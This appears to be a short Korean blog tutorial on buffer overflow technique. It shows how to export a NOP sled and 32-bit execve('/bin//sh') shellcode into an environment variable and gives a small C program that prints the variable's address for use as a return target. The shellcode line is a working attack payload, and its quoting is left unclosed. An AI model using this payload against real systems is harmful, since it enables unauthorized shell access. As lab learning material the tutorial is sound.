---
title: "환경변수 설정 및 주소 구하기"
excerpt: "환경변수 설정 및 주소 구하기"
toc: true
toc_sticky: true
categories:
  - Linux
  - BOF
tags:
  - 환경변수
---

## 1. 환경변수 설정
export 변수명=변수값
```php
ex)
export addr=`python -c 'print "\x90"*100+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"(변수 값)
```

## 2. 환경변수 주소 구하기

```php
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
   printf("env : %p\n", getenv(argv[1]));
   return 0;
}
```